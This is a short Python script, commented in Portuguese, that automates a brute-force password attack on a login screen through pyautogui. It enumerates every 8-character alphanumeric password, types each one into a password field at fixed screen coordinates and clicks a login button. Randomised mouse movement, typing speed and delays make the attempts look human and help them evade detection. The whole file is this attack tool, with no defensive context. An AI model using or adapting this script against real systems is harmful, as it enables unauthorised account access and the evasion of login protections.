import itertools
import string
import pyautogui
import time
import random

def stealth_login_test(charset, length, x_input, y_input, x_button, y_button):
    for password_tuple in itertools.product(charset, repeat=length):
        password = ''.join(password_tuple)
        try:
            pyautogui.moveTo(x_input, y_input, duration=random.uniform(0.1, 0.3))
            pyautogui.click()
            pyautogui.hotkey('ctrl', 'a')
            pyautogui.press('backspace')

            for char in password:
                pyautogui.write(char, interval=random.uniform(0.05, 0.1))

            pyautogui.moveTo(x_button, y_button, duration=random.uniform(0.1, 0.3))
            pyautogui.click()
            time.sleep(random.uniform(1, 3))
            
            print(f'Tentativa com senha: {password}')
        except Exception as e:
            print(f"Erro durante a tentativa: {str(e)}")
            continue

# Conjunto de caracteres incluindo números, letras maiúsculas e minúsculas
charset = string.digits + string.ascii_letters
length = 8

# Coordenadas para localizar senha e o login
x_input = 300  # X coordenada do campo de senha
y_input = 200  # Y coordenada do campo de senha
x_button = 350  # X coordenada do botão de login
y_button = 250  # Y coordenada do botão de login

stealth_login_test(charset, length, x_input, y_input, x_button, y_button)
